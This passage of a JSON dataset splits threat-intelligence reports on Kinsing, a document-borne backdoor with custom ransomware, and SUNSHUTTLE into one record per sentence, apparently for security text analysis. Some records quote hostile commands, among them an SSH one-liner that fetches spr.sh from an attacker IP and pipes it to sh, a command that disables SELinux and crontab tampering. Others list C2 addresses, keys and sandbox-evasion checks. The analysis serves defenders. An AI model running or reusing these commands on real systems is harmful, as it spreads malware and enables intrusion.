        "text": "We discovered that the shell script does the following:\n",
        "type": "",
        "report": "r-118",
        "line": 12,
        "index": 383
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S13",
        "text": "- Disables security measures and clears logs: echo SELINUX=disabled >/etc/selinux/config \n",
        "type": "",
        "report": "r-118",
        "line": 13,
        "index": 384
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S14",
        "text": "- Kills numerous applications, notably other malwares and cryptominers. \n",
        "type": "",
        "report": "r-118",
        "line": 14,
        "index": 385
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S15",
        "text": "- Deletes files related to other malwares/cryptominers, most of them from the /tmp directory \n",
        "type": "",
        "report": "r-118",
        "line": 15,
        "index": 386
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S16",
        "text": "- Kills running rival malicious Docker containers and deletes their image. \n",
        "type": "",
        "report": "r-118",
        "line": 16,
        "index": 387
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S17",
        "text": "- Downloads the \u2018kinsing\u2019 malware and runs it \n",
        "type": "",
        "report": "r-118",
        "line": 17,
        "index": 388
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S18",
        "text": "- Uses crontab to download and run the shell script every minute \n",
        "type": "",
        "report": "r-118",
        "line": 18,
        "index": 389
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S19",
        "text": "- Looks for other commands running in cron, and if ones were identified, deletes all cron jobs, including its own.",
        "type": "",
        "report": "r-118",
        "line": 19,
        "index": 390
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S20",
        "text": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.\n",
        "type": "",
        "report": "r-118",
        "line": 20,
        "index": 391
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S21",
        "text": "Kinsing is a Linux agent, identified by Virus Total after we submitted it for analysis.",
        "type": "",
        "report": "r-118",
        "line": 21,
        "index": 392
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S22",
        "text": "From here on we\u2019ll refer to the malware as kinsing.\n",
        "type": "",
        "report": "r-118",
        "line": 22,
        "index": 393
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S23",
        "text": "A quick look at the malware\u2019s strings reveals that it is a Golang-based Linux agent.",
        "type": "",
        "report": "r-118",
        "line": 23,
        "index": 394
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S24",
        "text": "It uses several Go libraries, including:\n",
        "type": "",
        "report": "r-118",
        "line": 24,
        "index": 395
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S25",
        "text": "- go-resty \u2013 an HTTP and REST client library, used to communicate with a Command and Control (C&C) server.",
        "type": "",
        "report": "r-118",
        "line": 25,
        "index": 396
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S26",
        "text": "- gopsutil \u2013 a process utility library, used for system and processes monitoring.\n",
        "type": "",
        "report": "r-118",
        "line": 26,
        "index": 397
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S27",
        "text": "- osext \u2013 extension to the standard \u2018os\u2019 package, used to execute binaries.\n",
        "type": "",
        "report": "r-118",
        "line": 27,
        "index": 398
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S28",
        "text": "- extension to the standard \u2018os\u2019 package, used to execute binaries.",
        "type": "",
        "report": "r-118",
        "line": 28,
        "index": 399
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S29",
        "text": "diskv - A disk-backed key-value store, for storage.\n",
        "type": "",
        "report": "r-118",
        "line": 29,
        "index": 400
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S30",
        "text": "Running the malware in a controlled environment and monitoring it brought up more details about its malicious actions.\n",
        "type": "",
        "report": "r-118",
        "line": 30,
        "index": 401
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S31",
        "text": "Before the malware proceeded to deploy its payload, it attempted to communicate with servers in Eastern Europe.",
        "type": "",
        "report": "r-118",
        "line": 31,
        "index": 402
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S32",
        "text": "It appears that there are dedicated servers for each function that the malware executes:\n",
        "type": "",
        "report": "r-118",
        "line": 32,
        "index": 403
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S33",
        "text": "- Attempts to establish a connection with the following IP address: 45.10.88.102.",
        "type": "",
        "report": "r-118",
        "line": 33,
        "index": 404
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S34",
        "text": "The attempts fail as the server does not respond. \n",
        "type": "",
        "report": "r-118",
        "line": 34,
        "index": 405
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S35",
        "text": "- Connects to 91.215.169.111, which appears to be the main C&C server.",
        "type": "",
        "report": "r-118",
        "line": 35,
        "index": 406
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S36",
        "text": "The malware communicates with that host over HTTP port 80, and sends small encrypted messages on regular intervals, every few seconds.",
        "type": "",
        "report": "r-118",
        "line": 36,
        "index": 407
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S37",
        "text": "- Connects to 217.12.221.244/spre.sh, which we presume stands for spread, as we will see in the next paragraph, to download a shell script used for lateral movement purposes. \n",
        "type": "",
        "report": "r-118",
        "line": 37,
        "index": 408
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S38",
        "text": "- Connects to 193.33.87.219 to download the cryptominer C&C communication.\n",
        "type": "",
        "report": "r-118",
        "line": 38,
        "index": 409
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S39",
        "text": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.\n",
        "type": "",
        "report": "r-118",
        "line": 39,
        "index": 410
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S40",
        "text": "In order to discover potential targets and locate the information it needs to authenticate against, the script passively collects data from /.ssh/config, .bash_history, /.ssh/known_hosts, and the likes.",
        "type": "",
        "report": "r-118",
        "line": 40,
        "index": 411
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S41",
        "text": "We did not identify any active scanning techniques used to identify additional targets.",
        "type": "",
        "report": "r-118",
        "line": 41,
        "index": 412
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S42",
        "text": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "type": "",
        "report": "r-118",
        "line": 42,
        "index": 413
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S43",
        "text": "The actual shell script is named spr.sh this time around, but it is identical to the a d.sh shell script used earlier in the attack sequence\n",
        "type": "",
        "report": "r-118",
        "line": 43,
        "index": 414
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S44",
        "text": "The following SSH command was used to spread it throughout the network: ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp \"sudo curl -L http://217.12.221.244/spr.sh|sh; sudo wget -q -O - http://217.12.221.244/spr.sh|sh;\"\n",
        "type": "",
        "report": "r-118",
        "line": 44,
        "index": 415
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S45",
        "text": "We noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection attempts, and their cleanup, possibly indicating that the attackers have some sense of evasion and were trying to hide their activities.\n",
        "type": "",
        "report": "r-118",
        "line": 45,
        "index": 416
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S46",
        "text": "At the last stage of the attack the malware runs a cryptominer called kdevtmpfsi.",
        "type": "",
        "report": "r-118",
        "line": 46,
        "index": 417
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S47",
        "text": "The cryptominer was identified by Virus Total as a Bitcoin miner.\n",
        "type": "",
        "report": "r-118",
        "line": 47,
        "index": 418
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S48",
        "text": "The cryptominer connects to a host with the 193.33.87.219 IP address using a log in request over HTTP, receives further instructions, and starts mining cryptocurrency.\n",
        "type": "",
        "report": "r-118",
        "line": 48,
        "index": 419
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S0",
        "text": "As pointed out in Malwarebytes\u2019s public report, the actor sent weaponized documents to the victim as an initial infection vector.",
        "type": "",
        "report": "r-124",
        "line": 0,
        "index": 420
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S1",
        "text": "The documents use sophisticated infection methods to try to impede detection.",
        "type": "",
        "report": "r-124",
        "line": 1,
        "index": 421
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S2",
        "text": "The initial infection can be summarized like this:\n",
        "type": "",
        "report": "r-124",
        "line": 2,
        "index": 422
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S3",
        "text": "- The user opens the malicious document and subsequently allows the macro to be executed; \n",
        "type": "",
        "report": "r-124",
        "line": 3,
        "index": 423
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S4",
        "text": "- A popup message box appears; \n",
        "type": "",
        "report": "r-124",
        "line": 4,
        "index": 424
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S5",
        "text": "- The current document gets saved to the path %temp% as HTML and accordingly stores all image files separately within the same directory; \n",
        "type": "",
        "report": "r-124",
        "line": 5,
        "index": 425
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S6",
        "text": "- Show decoy document; \n",
        "type": "",
        "report": "r-124",
        "line": 6,
        "index": 426
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S7",
        "text": "- Convert %temp%[document name]\\image003.png to the BMP file format and add the extension .zip; \n",
        "type": "",
        "report": "r-124",
        "line": 7,
        "index": 427
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S8",
        "text": "- Execute image003.zip, which actually contains HTML Application (HTA) code, with mshta.exe; \n",
        "type": "",
        "report": "r-124",
        "line": 8,
        "index": 428
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S9",
        "text": "- Remove previously created, temporary files.\n",
        "type": "",
        "report": "r-124",
        "line": 9,
        "index": 429
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S10",
        "text": "The executed image003.zip is an HTML Application (HTA) file containing the second stage payload.",
        "type": "",
        "report": "r-124",
        "line": 10,
        "index": 430
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S11",
        "text": "This HTA code creates the next payload at the hardcoded path C:/Users/Public/Downloads/Winvoke.exe.\n",
        "type": "",
        "report": "r-124",
        "line": 11,
        "index": 431
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S12",
        "text": "Besides the Microsoft Word document, the actor used an additional, alternative infection method according to our telemetry.",
        "type": "",
        "report": "r-124",
        "line": 12,
        "index": 432
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S13",
        "text": "Although we weren\u2019t able to acquire the initial file, we assume the actor delivered a file disguised as a PDF, since we discovered artefacts containing the path of the tool ezPDFReader: c:\\program files (x86)\\unidocs\\ezpdfreader2.0g\\ezpdfwslauncher.exe.",
        "type": "",
        "report": "r-124",
        "line": 13,
        "index": 433
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S14",
        "text": "This software is developed by a South Korean software company named Unidocs.",
        "type": "",
        "report": "r-124",
        "line": 14,
        "index": 434
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S15",
        "text": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "type": "",
        "report": "r-124",
        "line": 15,
        "index": 435
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S16",
        "text": "Notably, the compromised website www.allamwith[.]com was used for a long period of time.",
        "type": "",
        "report": "r-124",
        "line": 16,
        "index": 436
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S17",
        "text": "We first saw the URL appearing in the context of this threat actor in September 2020 and it was still in use when we were researching this series of attacks at the end of April 2021.\n",
        "type": "",
        "report": "r-124",
        "line": 17,
        "index": 437
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S18",
        "text": "When we analyzed the above malicious URLs, many of the resources had already gone offline, but the attacker is still using one distribution URL: hxxp://www.allamwith[.]com/home/css/skin.html\n",
        "type": "",
        "report": "r-124",
        "line": 18,
        "index": 438
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S19",
        "text": "The URL hosts still serving the HTML Application (HTA) file exhibit similar functions as the HTA file created by the malicious Word document.",
        "type": "",
        "report": "r-124",
        "line": 19,
        "index": 439
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S20",
        "text": "However, in the case of remotely fetched HTA code with PDF-style attacks, the next payload gets dropped to a different hardcoded path, located at C:/users/public/iexplore.exe, and eventually executed.\n",
        "type": "",
        "report": "r-124",
        "line": 20,
        "index": 440
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S21",
        "text": "The second stage payload is responsible for communicating with the C2 server and preparing another payload for the next stage.",
        "type": "",
        "report": "r-124",
        "line": 21,
        "index": 441
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S22",
        "text": "This second stage malware decrypts the embedded payload at runtime.",
        "type": "",
        "report": "r-124",
        "line": 22,
        "index": 442
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S23",
        "text": "It uses an embedded 16-byte XOR key to decrypt the base64 encoded payload.",
        "type": "",
        "report": "r-124",
        "line": 23,
        "index": 443
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S24",
        "text": "The decrypted payload is another portable executable file that runs in memory.",
        "type": "",
        "report": "r-124",
        "line": 24,
        "index": 444
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S25",
        "text": "The infection procedure of the second stage payload:\n",
        "type": "",
        "report": "r-124",
        "line": 25,
        "index": 445
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S26",
        "text": "- Create mutex named Microsoft32. \n",
        "type": "",
        "report": "r-124",
        "line": 26,
        "index": 446
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S27",
        "text": "- Resolve API address: base64 decoding + RC4 decryption with the key MicrosoftCorporationValidation@#$%^&*()!US \n",
        "type": "",
        "report": "r-124",
        "line": 27,
        "index": 447
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S28",
        "text": "- Retrieve C2 addresses: base64 decoding + custom XOR decryption. \n",
        "type": "",
        "report": "r-124",
        "line": 28,
        "index": 448
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S29",
        "text": "- Communication with C2.\n",
        "type": "",
        "report": "r-124",
        "line": 29,
        "index": 449
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S30",
        "text": "According to the response from the C2 server, the payload is able to perform five actions:\n",
        "type": "",
        "report": "r-124",
        "line": 30,
        "index": 450
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S31",
        "text": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "type": "",
        "report": "r-124",
        "line": 31,
        "index": 451
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S32",
        "text": "Both second and third stage payloads also share an identical icon, which looks like Internet Explorer.\n",
        "type": "",
        "report": "r-124",
        "line": 32,
        "index": 452
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S33",
        "text": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "type": "",
        "report": "r-124",
        "line": 33,
        "index": 453
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S34",
        "text": "Most of them use Internet Explorer or Google Chrome icons and corresponding file names to disguise themselves as legitimate internet browsers.",
        "type": "",
        "report": "r-124",
        "line": 34,
        "index": 454
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S35",
        "text": "The third stage decrypts the embedded payload and executes it.",
        "type": "",
        "report": "r-124",
        "line": 35,
        "index": 455
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S36",
        "text": "The embedded payload shows the same structure as the second stage payload discussed above.",
        "type": "",
        "report": "r-124",
        "line": 36,
        "index": 456
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S37",
        "text": "Once launched, it checks for the mutex QD33qhhXKK and inspects the system for signs of a sandbox environment by searching for the presence of specific modules.",
        "type": "",
        "report": "r-124",
        "line": 37,
        "index": 457
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S38",
        "text": "The strings of module names to be checked are decoded with a hardcoded XOR key: 0x4B762A554559586F6A45656545654130\n",
        "type": "",
        "report": "r-124",
        "line": 38,
        "index": 458
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S39",
        "text": "- sbiedll.dll: Sandboxie module\n",
        "type": "",
        "report": "r-124",
        "line": 39,
        "index": 459
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S40",
        "text": "- api_log.dll: SunBelt SandBox module\n",
        "type": "",
        "report": "r-124",
        "line": 40,
        "index": 460
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S41",
        "text": "- dir_watch.dll: SunBelt SandBox module\n",
        "type": "",
        "report": "r-124",
        "line": 41,
        "index": 461
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S42",
        "text": "With the environment checks done, the main payload gets decrypted using the same XOR key and launched with rundll32.exe.",
        "type": "",
        "report": "r-124",
        "line": 42,
        "index": 462
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S43",
        "text": "Three C2 addresses then get extracted and decrypted using DES, with all addresses pointing to the same IP (23.229.111[.]197) in this sample.",
        "type": "",
        "report": "r-124",
        "line": 43,
        "index": 463
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S44",
        "text": "The malware then sends a hardcoded string to the C2 server: \u201cHTTP 1.1 /member.php SSL3.4\u201d.",
        "type": "",
        "report": "r-124",
        "line": 44,
        "index": 464
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S45",
        "text": "Next, it checks if the C2\u2019s response data equals \u201cHTTP 1.1 200 OK SSL2.1\u201d and, if positive, starts conducting its backdoor operations.",
        "type": "",
        "report": "r-124",
        "line": 45,
        "index": 465
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S46",
        "text": "The samples contain debug data and thereby expose function names disclosing their purpose:\n",
        "type": "",
        "report": "r-124",
        "line": 46,
        "index": 466
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S47",
        "text": "- ModuleUpdate: Replace the current module with a batch file\n",
        "type": "",
        "report": "r-124",
        "line": 47,
        "index": 467
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S48",
        "text": "- ModuleShell: Execute Windows command, changes working directory, Connect to given IP address",
        "type": "",
        "report": "r-124",
        "line": 48,
        "index": 468
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S49",
        "text": "- ModuleFileManager: Get disk information, File listing, File manipulation\n",
        "type": "",
        "report": "r-124",
        "line": 49,
        "index": 469
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S50",
        "text": "- ModuleScreenCapture: Take a screenshot\n",
        "type": "",
        "report": "r-124",
        "line": 50,
        "index": 470
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S51",
        "text": "Interestingly, one victim was discovered to have received ransomware after the third stage payload.",
        "type": "",
        "report": "r-124",
        "line": 51,
        "index": 471
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S52",
        "text": "This ransomware sample is custom made and specifically developed by the threat actor behind this attack.",
        "type": "",
        "report": "r-124",
        "line": 52,
        "index": 472
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S53",
        "text": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.\n",
        "type": "",
        "report": "r-124",
        "line": 53,
        "index": 473
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S54",
        "text": "We saw the malware executed with the following parameter options in our telemetry, with some parameters illustrated below: \n",
        "type": "",
        "report": "r-124",
        "line": 54,
        "index": 474
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S55",
        "text": "Upon launch, the ransomware checks the number of parameters.",
        "type": "",
        "report": "r-124",
        "line": 55,
        "index": 475
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S56",
        "text": "If the number of arguments is less than six, the malware terminates itself.",
        "type": "",
        "report": "r-124",
        "line": 56,
        "index": 476
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S57",
        "text": "If there is no extension for the encrypted files specified, the malware uses a default extension (.3nc004) and a default file name for the ransom note (3nc004.txt).",
        "type": "",
        "report": "r-124",
        "line": 57,
        "index": 477
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S58",
        "text": "If the victim ID is left unspecified, the ransomware generates a random ID 24 characters long.",
        "type": "",
        "report": "r-124",
        "line": 58,
        "index": 478
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S59",
        "text": "If the malware is executed with the -s(-S) option, it sends the victim ID to the C2 server and receives the initial vector (IV) and key to encrypt files.",
        "type": "",
        "report": "r-124",
        "line": 59,
        "index": 479
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S60",
        "text": "Each of the strings has a length of 32 characters.",
        "type": "",
        "report": "r-124",
        "line": 60,
        "index": 480
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S61",
        "text": "When the ransomware communicates with the C2 server, it uses the same authentication process and strings as the third stage payload.\n",
        "type": "",
        "report": "r-124",
        "line": 61,
        "index": 481
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S62",
        "text": "The ransomware uses an AES-128 CBC mode algorithm to encrypt files on the victim machine.",
        "type": "",
        "report": "r-124",
        "line": 62,
        "index": 482
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S63",
        "text": "With the exception of system-critical files (\u201c.exe\u201d, \u201c.dll\u201d, \u201c.sys\u201d, .\u201dmsiins\u201d, and \u201c.drv\u201d extensions), the malware encrypts files completely, irrespective of file size.",
        "type": "",
        "report": "r-124",
        "line": 63,
        "index": 483
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S64",
        "text": "However, since important system configuration files are affected by the encryption procedure as well, it can lead to an unstable system.\n",
        "type": "",
        "report": "r-124",
        "line": 64,
        "index": 484
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S65",
        "text": "As a final step, it leaves a ransom note on the desktop and in the startup folder and opens it with notepad.exe.\n",
        "type": "",
        "report": "r-124",
        "line": 65,
        "index": 485
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S0",
        "text": "Once executed, the SUNSHUTTLE backdoor enumerates the victim\u2019s MAC address and compares it to a hardcoded MAC address value \u201cc8:27:cc:c2:37:5a\u201d.",
        "type": "",
        "report": "r-150",
        "line": 0,
        "index": 486
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S1",
        "text": "If a match is found the backdoor exits.",
        "type": "",
        "report": "r-150",
        "line": 1,
        "index": 487
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S2",
        "text": "The MAC address is likely a default MAC address for the Windows sandbox network adapter.",
        "type": "",
        "report": "r-150",
        "line": 2,
        "index": 488
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S3",
        "text": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "type": "",
        "report": "r-150",
        "line": 3,
        "index": 489
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S4",
        "text": "For the sample analyzed, the configuration filename is \u201cconfig.dat.tmp\u201d.",
        "type": "",
        "report": "r-150",
        "line": 4,
        "index": 490
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S5",
        "text": "The configuration data is Base64 encoded and AES-256 encrypted using the following key: hz8l2fnpvp71ujfy8rht6b0smouvp9k8\n",
        "type": "",
        "report": "r-150",
        "line": 5,
        "index": 491
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S6",
        "text": "The configuration has the following example values when Base64 decoded and AES decrypted:\n",
        "type": "",
        "report": "r-150",
        "line": 6,
        "index": 492
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S7",
        "text": "The configuration holds several values delimited by a \u201c|\u201d character, which are briefly described as follows.",
        "type": "",
        "report": "r-150",
        "line": 7,
        "index": 493
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S8",
        "text": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "type": "",
        "report": "r-150",
        "line": 8,
        "index": 494
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S9",
        "text": "The following URLs are leveraged for the \u201cblend-in\u201d requests:\n",
        "type": "",
        "report": "r-150",
        "line": 9,
        "index": 495
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S10",
        "text": "SUNSHUTTLE performs initial requests to the C2 in order to request and then retrieve what it internally refers to as a session key.",
        "type": "",
        "report": "r-150",
        "line": 10,
        "index": 496
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S11",
        "text": "The retrieved session key from the C2 appears to be RSA decrypted using the following private key that is embedded in SUNSHUTTLE and believed to be unique per compiled sample.",
        "type": "",
        "report": "r-150",
        "line": 11,
        "index": 497
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S12",
        "text": "Analysis is on-going on how the decrypted session key is used, but it is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.\n",
        "type": "",
        "report": "r-150",
        "line": 12,
        "index": 498
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S13",
        "text": "After the configuration is created or read from, SUNSHUTTLE enters a routine named \u201c\ufeffmain_request_session_key\u201d.",
        "type": "",
        "report": "r-150",
        "line": 13,
        "index": 499
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S14",
        "text": "The malware will iterate over this routine until it\u2019s successful, sleeping a period of time after each iteration.\n",
        "type": "",
        "report": "r-150",
        "line": 14,
        "index": 500
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S15",
        "text": "Inside the \u201c\ufeffmain_request_session_key\u201d routine, SUNSHUTTLE constructs an HTTPS request to its configured C2.",
        "type": "",
        "report": "r-150",
        "line": 15,
        "index": 501
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S16",
        "text": "Upon an HTTP 200 response from the request, the response data from the C2 is expected to not contain the following string for the sample analyzed: ywQdjLuHHC\n",
        "type": "",
        "report": "r-150",
        "line": 16,
        "index": 502
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S17",
        "text": "The request_session_key routine returns a 1 if the string is not in the response and a -1 if it is in the response.",
        "type": "",
        "report": "r-150",
        "line": 17,
        "index": 503
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S18",
        "text": "If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine.",
        "type": "",
        "report": "r-150",
        "line": 18,
        "index": 504
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S19",
        "text": "The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key.",
        "type": "",
        "report": "r-150",
        "line": 19,
        "index": 505
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S20",
        "text": "The decrypted content is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.",
        "type": "",
        "report": "r-150",
        "line": 20,
        "index": 506
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S21",
        "text": "Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and \u201cresolve_command\u201d routines in a loop.",
        "type": "",
        "report": "r-150",
        "line": 21,
        "index": 507
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S22",
        "text": "SUNSHUTTLE first issues a beacon to retrieve a command.",
        "type": "",
        "report": "r-150",
        "line": 22,
        "index": 508
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S23",
        "text": "After, SUNSHUTTLE will enter the routine \u201cresolve_command\u201d, which parses the response content to determine which command should be run.",
        "type": "",
        "report": "r-150",
        "line": 23,
        "index": 509
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S24",
        "text": "Available commands include remotely updating its configuration, file upload and download, and arbitrary command execution.",
        "type": "",
        "report": "r-150",
        "line": 24,
        "index": 510
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S25",
        "text": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted.",
        "type": "",
        "report": "r-150",
        "line": 25,
        "index": 511
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S26",
        "text": "A check is performed to ensure the decrypted content doesn\u2019t contain the following string: Cp5RTQ31R1\n",
        "type": "",
        "report": "r-150",
        "line": 26,
        "index": 512
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S27",
        "text": "As noted, it is likely these strings are unique per sample and randomly generated at compilation.",
        "type": "",
        "report": "r-150",
        "line": 27,
        "index": 513
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S28",
        "text": "The decrypted content is parsed for certain unique strings.\n",
        "type": "",
        "report": "r-150",
        "line": 28,
        "index": 514
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S29",
        "text": "After successful execution of the malware, it drops the following files to the victim\u2019s system: <current_directory>\\config.dat.tmp (MD5: Dynamic) Encrypted configuration file\n",
        "type": "",
        "report": "r-150",
        "line": 29,
        "index": 515
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S30",
        "text": "The SUNSHUTTLE malware was not observed setting its own persistence.",
        "type": "",
        "report": "r-150",
        "line": 30,
        "index": 516
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S31",
        "text": "It is likely the persistence is set outside of the execution of SUNSHUTTLE.\n",
        "type": "",
        "report": "r-150",
        "line": 31,
        "index": 517
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S32",
        "text": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "type": "",
        "report": "r-150",
        "line": 32,
        "index": 518
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S33",
        "text": "Additionally, a referrer is selected from the following list, presumably to make the traffic blend in if traffic is being decrypted for inspection:\n",
        "type": "",
        "report": "r-150",
        "line": 33,
        "index": 519
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S34",
        "text": "The cookie headers vary slightly depending on the operation being performed.",
        "type": "",
        "report": "r-150",
        "line": 34,
        "index": 520
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S35",
